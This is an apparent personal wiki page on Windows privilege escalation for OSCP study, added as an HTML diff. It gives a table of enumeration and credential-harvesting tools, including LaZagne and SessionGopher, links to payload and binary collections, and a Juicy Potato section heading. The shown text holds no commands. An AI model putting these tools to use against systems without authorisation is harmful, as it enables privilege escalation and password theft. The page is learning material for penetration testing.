@@ -1,0 +1,2164 @@
+
+<!doctype html>
+<html lang="es" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Grunt's Blog">
+      
+      
+      
+        <link rel="canonical" href="https://igruntplay.github.io/OSCP/winPrivEsc/">
+      
+      
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.22">
+    
+    
+      
+        <title>Windows Privilege Escalation - Grunt's Personal Wiki</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.84d31ad4.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CFira+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"Fira Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="lime" data-md-color-accent="teal">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#windows-privilege-escalation" class="md-skip">
+          Saltar a contenido
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Cabecera">
+    <a href="../.." title="Grunt&#39;s Personal Wiki" class="md-header__button md-logo" aria-label="Grunt's Personal Wiki" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Grunt's Personal Wiki
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Windows Privilege Escalation
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="lime" data-md-color-accent="teal"  aria-label="Cambiar a modo claro"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Cambiar a modo claro" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="teal" data-md-color-accent="lime"  aria-label="Cambiar a modo oscuro"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Cambiar a modo oscuro" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Búsqueda" placeholder="Búsqueda" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Buscar">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Limpiar" aria-label="Limpiar" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Inicializando búsqueda
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/G4sp4rCS/igruntplay.github.io" title="Ir al repositorio" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    G4sp4rCS/igruntplay.github.io
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navegación" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Grunt&#39;s Personal Wiki" class="md-nav__button md-logo" aria-label="Grunt's Personal Wiki" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Grunt's Personal Wiki
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/G4sp4rCS/igruntplay.github.io" title="Ir al repositorio" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    G4sp4rCS/igruntplay.github.io
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Inicio
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    Ofensiva
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Ofensiva
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../bin-exploitation/bin-exploitation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Fundamentos de explotación
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../OSCP/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    OSCP Preparation
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../WindowsHacking/windowsHackingIndex/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Windows Hacking
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../privilege-escalation-linux-assistance/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    PrivEsc Cheatsheet
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HavocC2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Havoc C2 101
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../scripts/scripts/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Scripts & Exploits
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../dnsSpoofing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    DNS Spoofing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../subdomain-enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Subdomain Enumeration
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    Cloud & AppSec
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Cloud & AppSec
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CloudHacking/cloudHacking/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Cloud Hacking
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CloudHacking/AWS-enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    AWS Enumeration
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CloudHacking/AWS-Attacking/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    AWS Attacking
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../AppSecKPI/AppSecKPI/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    AppSec KPI & Metrics
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../bug-bounty-resources/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Bug Bounty Resources
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../corsPOC/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    CORS PoC
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    Certificaciones
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            Certificaciones
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../BSCP/BSCP/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    BSCP Preparation
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../BSCP/practicioner-labs-notes/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    BSCP Practitioner Labs
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../BSCP/OAuth-account-hijacking-via-redirect_uri/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    OAuth Hijacking Notes
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ejpt/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    eJPT Notes
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    Programación & AI
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            Programación & AI
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Rust/rust/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Rust Programming
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Rust/closures-rust/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Rust: Closures
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Rust/smart-pointers-rust/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Rust: Smart Pointers
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../AI/AI/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    AI for Red Teaming
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../AI/fundamentals/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    AI Fundamentals
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../AI/DecisionTrees/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Decision Trees
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../AI/NaiveBayes/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Naive Bayes
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../university/university/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Apuntes universitarios
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    Miscelánea
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            Miscelánea
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../android-pentesting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Android Pentesting Setup
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../BurpSuite-regex/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    BurpSuite Regex Cheatsheet
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../jobs/jobs/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Jobs Interview Tips
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../gaming/gaming/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Gaming Settings
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../xss/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    XSS Payloads
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+    <a href="https://github.com/G4sp4rCS/igruntplay.github.io/edit/master/docs/OSCP/winPrivEsc.md" title="Editar esta página" class="md-content__button md-icon" rel="edit">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M10 20H6V4h7v5h5v3.1l2-2V8l-6-6H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h4zm10.2-7c.1 0 .3.1.4.2l1.3 1.3c.2.2.2.6 0 .8l-1 1-2.1-2.1 1-1c.1-.1.2-.2.4-.2m0 3.9L14.1 23H12v-2.1l6.1-6.1z"/></svg>
+    </a>
+  
+  
+
+
+<h1 id="windows-privilege-escalation">Windows Privilege Escalation<a class="headerlink" href="#windows-privilege-escalation" title="Permanent link">&para;</a></h1>
+<h2 id="useful-tools">Useful tools<a class="headerlink" href="#useful-tools" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Seatbelt</td>
+<td>C# project for performing a wide variety of local privilege escalation checks</td>
+</tr>
+<tr>
+<td>winPEAS</td>
+<td>WinPEAS is a script that searches for possible paths to escalate privileges on Windows hosts. All of the checks are explained here</td>
+</tr>
+<tr>
+<td>PowerUp</td>
+<td>PowerShell script for finding common Windows privilege escalation vectors that rely on misconfigurations. It can also be used to exploit some of the issues found</td>
+</tr>
+<tr>
+<td>SharpUp</td>
+<td>C# version of PowerUp</td>
+</tr>
+<tr>
+<td>JAWS</td>
+<td>PowerShell script for enumerating privilege escalation vectors written in PowerShell 2.0</td>
+</tr>
+<tr>
+<td>SessionGopher</td>
+<td>SessionGopher is a PowerShell tool that finds and decrypts saved session information for remote access tools. It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information</td>
+</tr>
+<tr>
+<td>Watson</td>
+<td>Watson is a .NET tool designed to enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities.</td>
+</tr>
+<tr>
+<td>LaZagne</td>
+<td>Tool used for retrieving passwords stored on a local machine from web browsers, chat tools, databases, Git, email, memory dumps, PHP, sysadmin tools, wireless network configurations, internal Windows password storage mechanisms, and more</td>
+</tr>
+<tr>
+<td>Windows Exploit Suggester - Next Generation</td>
+<td>WES-NG is a tool based on the output of Windows’ systeminfo utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities. Every Windows OS between Windows XP and Windows 10 is supported</td>
+</tr>
+<tr>
+<td>Sysinternals Suite</td>
+<td>We will use several tools from Sysinternals in our enumeration including AccessChk, PipeList, and PsService</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md">Payload all the things Windows PrivEsc</a></li>
+<li><a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries">More Binaries</a></li>
+<li><a href="https://github.com/gtworek/Priv2Admin">Lista de privilegios interesantes</a></li>
+</ul>
+<h2 id="seimpersonate-and-seassignprimarytoken">SeImpersonate and SeAssignPrimaryToken<a class="headerlink" href="#seimpersonate-and-seassignprimarytoken" title="Permanent link">&para;</a></h2>
+<h3 id="seimpersonate-example-juicy-potato">SeImpersonate example - Juicy Potato<a class="headerlink" href="#seimpersonate-example-juicy-potato" title="Permanent link">&para;</a></h3>
+<ul>
